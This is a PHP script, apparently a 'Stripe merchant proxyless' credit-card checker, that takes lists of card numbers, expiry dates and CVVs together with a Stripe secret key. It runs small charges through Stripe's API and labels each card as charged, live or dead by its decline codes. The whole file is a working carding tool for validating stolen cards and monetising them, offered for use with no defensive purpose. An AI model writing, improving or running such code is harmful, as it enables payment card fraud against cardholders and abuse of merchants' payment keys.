<?php


//===================== [ MADE BY SA ] ====================//
#---------------[ STRIPE MERCHANTE PROXYLESS ]----------------#



error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');


//================ [ FUNCTIONS & LISTA ] ===============//

function GetStr($string, $start, $end){
    $string = ' ' . $string;
    $ini = strpos($string, $start);
    if ($ini == 0) return '';
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return trim(strip_tags(substr($string, $ini, $len)));
}


function multiexplode($seperator, $string){
    $one = str_replace($seperator, $seperator[0], $string);
    $two = explode($seperator[0], $one);
    return $two;
    };
if(isset($_GET['amo'])){

$amt = $_GET['amo'];
}
if(empty($amt)) {
	$amt = '0.5';
}
	$chr = $amt * 100;
if(isset($_GET['skc'])){

    $get_sk = $_GET['skc'];

}
$sk= trim($get_sk);
$lista = $_GET['lista'];
    $cc = multiexplode(array(":", "|", ""), $lista)[0];
    $mes = multiexplode(array(":", "|", ""), $lista)[1];
    $ano = multiexplode(array(":", "|", ""), $lista)[2];
    $cvv = multiexplode(array(":", "|", ""), $lista)[3];

if (strlen($mes) == 1) $mes = "0$mes";
if (strlen($ano) == 2) $ano = "20$ano";




//================= [ CURL REQUESTS ] =================//

#-------------------[1st REQ]--------------------#
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[cvc]='.$cvv.'');
$result1 = curl_exec($ch);
$tok1 = Getstr($result1,'"id": "','"');
$msg = Getstr($result1,'"message": "','"');
//echo "<br><b>Result1: </b> $result1<br>";

#-------------------[2nd REQ]--------------------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount='.$amt.
'&currency=usd&payment_method_types[]=card');
$result2 = curl_exec($ch);
$tok2 = Getstr($result2,'"id": "','"');
//echo "<b>Result2: </b> $result2<br>";

#-------------------[3rd REQ]--------------------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents/'.$tok2.'/confirm');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method='.$tok1.'');
$result3 = curl_exec($ch);
$dcode = Getstr($result3,'"decline_code": "','"');
$reason = Getstr($result3,'"reason": "','"');
$riskl = Getstr($result3,'"risk_level": "','"');
$seller_msg = Getstr($result3,'"seller_message": "','"');
$cvccheck = Getstr($result3,'"cvc_check": "','"');

if ($cvccheck == "pass") $cvccheck = "Pass! ✅";
elseif ($cvccheck == "fail") $cvccheck = "Fail! ❌";
elseif ($cvccheck == "unavailable") $cvccheck = "NA";



$respo = "D_code: <b>$dcode | </b>Reason: <b>$reason | </b>Cvv: <b>$cvccheck | </b>Risk: <b>$riskl | </b>Msg: <b>$seller_msg</b><br>";
//echo "<b><br>Result: </b>$respo<br>";



$receipturl = trim(strip_tags(getStr($result3,'"receipt_url": "','"')));



//=================== [ RESPONSES ] ===================//

if(strpos($result3, '"seller_message": "Payment complete."' )) {
    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span>  <br>➤ Response: $1 Charged ✅ cyberxbd <br> ➤ Receipt : <a href='.$receipturl.'>Here</a><br>';
}
elseif(strpos($result3,'"cvc_check": "pass"')){
    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVV LIVE cyberxbd</span><br>';
}


elseif(strpos($result1, "generic_decline")) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: GENERIC DECLINED cyberxbd </span><br>';
    }
elseif(strpos($result3, "generic_decline" )) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: GENERIC DECLINED cyberxbd</span><br>';
}
elseif(strpos($result3, "insufficient_funds" )) {
    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: INSUFFICIENT FUNDS cyberxbd</span><br>';
}

elseif(strpos($result3, "fraudulent" )) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: FRAUDULENT cyberxbd</span><br>';
}
elseif(strpos($resul3, "do_not_honor" )) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: DO NOT HONOR cyberxbd</span><br>';
    }
elseif(strpos($resul2, "do_not_honor" )) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: DO NOT HONOR cyberxbd</span><br>';
}
elseif(strpos($result,"fraudulent")){
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: FRAUDULENT cyberxbd </span><br>';

}

elseif(strpos($result2,'"code": "incorrect_cvc"')){
    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: Security code is incorrect cyberxbd</span><br>';
}
elseif(strpos($result1,' "code": "invalid_cvc"')){
    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: Security code is incorrect cyberxbd</span><br>';
     
}
elseif(strpos($result1,"invalid_expiry_month")){
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: INVAILD EXPIRY MONTH cyberxbd</span><br>';

}
elseif(strpos($result2,"invalid_account")){
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: INVAILD ACCOUNT cyberxbd</span><br>';

}

elseif(strpos($result2, "do_not_honor")) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: DO NOT HONOR cyberxbd</span><br>';
}
elseif(strpos($result2, "lost_card" )) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: LOST CARD cyberxbd</span><br>';
}
elseif(strpos($result3, "lost_card" )) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: LOST CARD cyberxbd</span></span>  <br>Result: CHECKER BY cyberxbd</span> <br>';
}

elseif(strpos($result2, "stolen_card" )) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: STOLEN CARD cyberxbd</span><br>';
    }

elseif(strpos($result3, "stolen_card" )) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: STOLEN CARD cyberxbd</span><br>';


}
elseif(strpos($result2, "transaction_not_allowed" )) {
    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: TRANSACTION NOT ALLOWED cyberxbd</span><br>';
    }
    elseif(strpos($result3, "authentication_required")) {
    	echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: 32DS REQUIRED cyberxbd</span><br>';
   } 
   elseif(strpos($result3, "card_error_authentication_required")) {
    	echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: 32DS REQUIRED cyberxbd</span><br>';
   } 
   elseif(strpos($result2, "card_error_authentication_required")) {
    	echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: 32DS REQUIRED cyberxbd</span><br>';
   } 
   elseif(strpos($result1, "card_error_authentication_required")) {
    	echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: 32DS REQUIRED cyberxbd</span><br>';
   } 
elseif(strpos($result3, "incorrect_cvc" )) {
    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: Security code is incorrect cyberxbd</span><br>';
}
elseif(strpos($result2, "pickup_card" )) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: PICKUP CARD cyberxbd</span><br>';
}
elseif(strpos($result3, "pickup_card" )) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: PICKUP CARD</span><br>';

}
elseif(strpos($result2, 'Your card has expired.')) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: EXPIRED CARD</span><br>';
}
elseif(strpos($result3, 'Your card has expired.')) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: EXPIRED CARD</span><br>';

}
elseif(strpos($result3, "card_decline_rate_limit_exceeded")) {
	echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: SK IS AT RATE LIMIT</span><br>';
}
elseif(strpos($result3, '"code": "processing_error"')) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: PROCESSING ERROR</span><br>';
    }
elseif(strpos($result3, ' "message": "Your card number is incorrect."')) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: YOUR CARD NUMBER IS INCORRECT</span><br>';
    }
elseif(strpos($result3, '"decline_code": "service_not_allowed"')) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: SERVICE NOT ALLOWED</span><br>';
    }
elseif(strpos($result2, '"code": "processing_error"')) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: PROCESSING ERROR</span><br>';
    }
elseif(strpos($result2, ' "message": "Your card number is incorrect."')) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: YOUR CARD NUMBER IS INCORRECT</span><br>';
    }
elseif(strpos($result2, '"decline_code": "service_not_allowed"')) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: SERVICE NOT ALLOWED</span><br>';

}
elseif(strpos($result, "incorrect_number")) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: INCORRECT CARD NUMBER</span><br>';
}
elseif(strpos($result1, "incorrect_number")) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: INCORRECT CARD NUMBER</span><br>';


}elseif(strpos($result1, "do_not_honor")) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: DO NOT HONOR</span><br>';

}
elseif(strpos($result1, 'Your card was declined.')) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CARD DECLINED</span><br>';

}
elseif(strpos($result1, "do_not_honor")) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: DO NOT HONOR</span><br>';
    }
elseif(strpos($result2, "generic_decline")) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: GENERIC CARD</span><br>';
}
elseif(strpos($result, 'Your card was declined.')) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CARD DECLINED</span><br>';

}
elseif(strpos($result3,' "decline_code": "do_not_honor"')){
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: DO NOT HONOR</span><br>';
}
elseif(strpos($result2,'"cvc_check": "unchecked"')){
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVC_UNCHECKED : INFORM AT OWNER</span><br>';
}
elseif(strpos($result2,'"cvc_check": "fail"')){
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVC_CHECK : FAIL</span><br>';
}
elseif(strpos($result3, "card_not_supported")) {
	echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CARD NOT SUPPORTED</span><br>';
}
elseif(strpos($result2,'"cvc_check": "unavailable"')){
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVC_CHECK : UNVAILABLE</span><br>';
}
elseif(strpos($result3,'"cvc_check": "unchecked"')){
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVC_UNCHECKED : INFORM TO OWNER」</span><br>';
}
elseif(strpos($result3,'"cvc_check": "fail"')){
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVC_CHECKED : FAIL</span><br>';
}
elseif(strpos($result3,"currency_not_supported")) {
	echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CURRENCY NOT SUPORTED TRY IN INR</span><br>';
}

elseif (strpos($result,'Your card does not support this type of purchase.')) {
    echo '#DIE</span> CC:  '.$lista.'</span>  <br>Result: CARD NOT SUPPORT THIS TYPE OF PURCHASE</span><br>';
    }

elseif(strpos($result2,'"cvc_check": "pass"')){
    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVV LIVE</span><br>';
}
elseif(strpos($result3, "fraudulent" )) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: FRAUDULENT</span><br>';
}
elseif(strpos($result1, "testmode_charges_only" )) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: SK KEY #DIE OR INVALID</span><br>';
}
elseif(strpos($result1, "api_key_expired" )) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: SK KEY REVOKED</span><br>';
}
elseif(strpos($result1, "parameter_invalid_empty" )) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: ENTER CC TO CHECK</span><br>';
}
elseif(strpos($result1, "card_not_supported" )) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CARD NOT SUPPORTED</span><br>';
}
else {
    echo '#DIE</span> CC:  '.$lista.'</span>  <br>Result: INCREASE AMOUNT OR TRY ANOTHER CARD</span><br>';
   
   
      
}
curl_close($ch);
ob_flush();
?>